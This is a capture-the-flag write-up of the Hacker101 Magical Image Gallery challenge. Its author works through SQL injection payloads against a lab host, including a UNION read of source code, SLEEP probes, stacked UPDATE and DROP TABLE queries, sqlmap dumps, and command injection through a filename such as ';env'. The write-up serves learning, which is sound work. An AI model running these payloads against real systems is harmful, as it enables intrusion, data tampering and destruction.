# Hacker101 Magical Image Gallery

https://ctf.hacker101.com/ctf

```bash
export BASE_URL='https://cb00af0bdc36bdf4d99b75f3e2b4f0a0.ctf.hacker101.com'
```

We get a website to start with:

```bash
% curl $BASE_URL
[...]
<div><div><img src="fetch?id=1" width="266" height="150"><br>Utterly adorable</div><div><img src="fetch?id=2" width="266" height="150"><br>Purrfect</div><div><img src="fetch?id=3" width="266" height="150"><br>Invisible</div><i>Space used: 0	total</i></div>
[...]
% curl "$BASE_URL/fetch?id=1"
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
% curl "$BASE_URL/fetch?id='"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
```

That's a start - we get a 500 if we pass something that's not an integer to fetch. 

Is this vulnerable to SQL injection? Various 500 errors:

```bash
curl "$BASE_URL/fetch?id='"
curl "$BASE_URL/fetch?id='%20OR%201=1"
curl "$BASE_URL/fetch?id=%22%20OR%201=1"
curl "$BASE_URL/fetch?id=%22%20OR%20%22a%22=%22a"
```

How would I write this?

`"SELECT image FROM images WHERE id = " + int(input)`

Maybe I'm missing something with SQL injection. 

`ffuf` gives us some interesting words to use:

```
% ffuf -w ~/dev/ggordon-sec-tools/words/ffuf/common.txt -u "${BASE_URL}/fetch?id=FUZZ" -fc 500

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : ${BASE_URL}/fetch?id=FUZZ
 :: Wordlist         : FUZZ: path/ffuf/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

01                      [Status: 200, Size: 97806, Words: 322, Lines: 379, Duration: 99ms]
02                      [Status: 200, Size: 98716, Words: 425, Lines: 419, Duration: 107ms]
1                       [Status: 200, Size: 97806, Words: 322, Lines: 379, Duration: 137ms]
2                       [Status: 200, Size: 98716, Words: 425, Lines: 419, Duration: 147ms]
id                      [Status: 200, Size: 97806, Words: 322, Lines: 379, Duration: 122ms]
true                    [Status: 200, Size: 97806, Words: 322, Lines: 379, Duration: 136ms]
```

Why do `id` and `true` work? Another `ffuf` run shows that `parent`, `ID`, and `Id` also work. 

These all return the same photo that `id=1` returns. 

So, for our theoretical SQL query, we're not casting to int. 

`"SELECT image FROM images WHERE id = " + input`

`curl "$BASE_URL/fetch?id=1%20--"`

This is interesting --

```bash
% curl "$BASE_URL/fetch?id=1--"
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
% curl "$BASE_URL/fetch?id=1++"
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

So are we just like using bash eval or something? 

Possibly - it looks like we can delimit stuff with a semicolon:

```
% curl "$BASE_URL/fetch?id=1;ls" 
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

`"SELECT image FROM images WHERE filename = " + $(ls input + '*')`

`% curl "$BASE_URL/fetch?id=3||3" -o jpg.jpg ` this also works to get image id 1

I have no idea what's going on here. The hints suggest using a union, and that we're using
the uwsgi-nginx-flask-docker Docker image. 

`curl "${BASE_URL}/fetch?id=11%20UNION%20SELECT%20'../../../main.py'"`

This gets us there, and gets a flag. Honestly, I had to look this up. I don't really understand
why this works. But, it gets us the source code, so we can take a look at that to understand:

```
@app.route('/fetch')
def fetch():
	cur = getDb().cursor()
	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
		abort(404)

	return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
```

Oh, so we have a database of files, and then separately we're accessing the filesystem. 

I guess we didn't need the `../../` path traversal, there's logic in here to prevent that sort of attack. 

Why does the UNION work? Why does this get us _only_ the file, and not the photo? Oh, it's because the 
SQL query isn't responsible for retrieving the file - it's only responsible for ensuring that the file
is in the database. 

Why do we need to use a filename that doesn't exist? Maybe it's like `&&` in bash, the second part of the
UNION is only executed only if that first part doesn't catch anything. We don't use UNION ALL here, so 
both parts of the query don't need to return something. 

Moving on. I'd guess we're meant to do some sort of XSS by inserting data into the database, then 
defeating the `sanitize` function:

```
def sanitize(data):
	return data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')

@app.route('/')
def index():
	cur = getDb().cursor()
	cur.execute('SELECT id, title FROM albums')
	albums = list(cur.fetchall())

	rep = ''
	for id, title in albums:
		rep += '<h2>%s</h2>\n' % sanitize(title)
[...]
```

So, how can we insert data? Can we use our SQL injection to chain together multiple statements?

Doesn't look like it - https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-execute.html 
suggests that we need `multi=True` for this, which isn't set. So we can't use a semicolon to split statements.

Possible to chain with AND or something? Doesn't seem like it:

```
% curl "${BASE_URL}/fetch?id=1%20AND%201=INSERT%20INTO%20photos%20(id,title)%20VALUES%20(4,'asdf');"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
% curl "${BASE_URL}/fetch?id=1%20AND%201=(INSERT%20INTO%20photos%20(id,title)%20VALUES%20(4,'asdf'));"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
% curl "${BASE_URL}/fetch?id=1%20AND%20'a'=(INSERT%20INTO%20photos%20(id,title)%20VALUES%20(4,'asdf'));"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
```

Let's take a step back. The next hint suggests the "Space used" function is suspicious. Formatted:

```
rep += 
  '<i>Space used: ' + 
  subprocess.check_output(
    'du -ch %s || exit 0' % 
    ' '.join('files/' + fn for fn in fns), 
    shell=True, stderr=subprocess.STDOUT
  )
  .strip().rsplit('\n', 1)[-1] + 
  '</i>'
```

So we're running `du -ch %s || exit 0`... how is `%s` set?

`' '.join('files/' + fn for fn in fns)`

Where `fns` is file names as listed from the database. Really seems like we need to find a SQL injection. 
If we could, we could run arbitrary commands like `du -ch ./file || my_cool_commands || exit 0`.

This seems to work:

`curl "${BASE_URL}/fetch?id=11%20OR%20SLEEP(5);"`

This definitely worked, webapp crashed:

`curl "${BASE_URL}/fetch?id=1;DROP%20TABLE%20photos"`

Oh, the hint about "committing" is about COMMIT for prepared statements... one sec, let's re-create the webapp.

Maybe we can update the title for an existing post? Yeah, this worked:

`curl "${BASE_URL}/fetch?id=1;UPDATE%20photos%20SET%20title='pwned';COMMIT;"`

Tried to defeat the `sanitize` function, but maybe that's not the way? Oh, let's update the filename for
something, so that we can run bash commands with the `du -ch` call. 

`curl "${BASE_URL}/fetch?id=1;UPDATE%20photos%20SET%20filename='';COMMIT;"`

This locked me out of the app again. That's something to be aware of, my SQL injection requires that the `fetch`
command from the source code actually works. 

`curl "${BASE_URL}/fetch?id=1;UPDATE%20photos%20SET%20filename=''%20WHERE%20id='2';COMMIT;"`

This keeps me working - I'm able to mess with file id 2, while keeping 1 available for the exploit. 

And, there we go, another flag with:

`curl "${BASE_URL}/fetch?id=1;UPDATE%20photos%20SET%20filename=';env'%20WHERE%20id='2';COMMIT;"`

But, the hints are confusing for this last flag - are they mixed up? The stuff about finding the album size, 
stacked queries, environment, all made sense for the flag I just found, but it's saying I found a different
flag...

I guess, if the hints are mixed up, one interesting thing is that the `viewAlbum` variable is never used,
and we don't ever see the results of querying the `albums` database. What's up with that? I know we can 
drop that table, but that doesn't seem interesting. What if we set parent the same everywhere?

`curl "${BASE_URL}/fetch?id=1;UPDATE%20albums%20SET%20parent=(SELECT%20id%20FROM%20albums);COMMIT;"`

Didn't seem to do anything. Maybe update the title of the album?

`curl "${BASE_URL}/fetch?id=1;UPDATE%20albums%20SET%20title='pwned';COMMIT;"`

Worked fine, no flag. XSS? Tried a few things... maybe we can get it in the subprocess output? No luck there, either. 

I looked at a few walkthroughs, and everything mentions something called `sqlmap`, an automated SQL
injection exploration engine. Does that work? 

```
% python3 sqlmap.py -u "${BASE_URL}/fetch?id=1"
[...]
[08:29:30] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
```

OK, we knew that. What are the other options?

```
 % python3 sqlmap.py -u "${BASE_URL}/fetch?id=1" --dbs
[...]
[08:32:48] [INFO] retrieved: 4
[08:32:53] [INFO] retrieved: information_schema
[08:33:36] [INFO] retrieved: level5
[08:33:57] [INFO] retrieved: mysql
[08:34:06] [INFO] retrieved: performance_schema
```

Wow! This is like magic. I'd guess that we're using `LIKE` queries under the hood to determine each letter of each
table sequentially. This is a hassle to do manually, so it's cool that there's a tool to automate this process. 
It does take a long time to run, since we're brute-forcing every letter - I wonder if there's a way to provide
hints to the engine when you know what certain values are going to be? Something to explore in the future - for now,
let's dump some values:

```
% python3 sqlmap.py -u '${BASE_URL}/fetch?id=1' --dump -D level5
[...]
Database: level5
Table: photos
[3 entries]
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                                                         |
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
| 3  | Invisible        | 1      | FLAG                                                             |
+----+------------------+--------+------------------------------------------------------------------+
```

Hmm, this is the same flag we found earlier. 

After some poking around, this worked by dumping all of the flags:

`curl "${BASE_URL}/fetch?id=1;UPDATE%20photos%20SET%20filename=';env;env;env;env|xargs||'%20WHERE%20id='2';COMMIT;"`

So we're more aggressively attacking the "Space used" funuction. We need `env|xargs` because the function only
prints one line of output, so we need to get everything on the same line. 

On to the next!
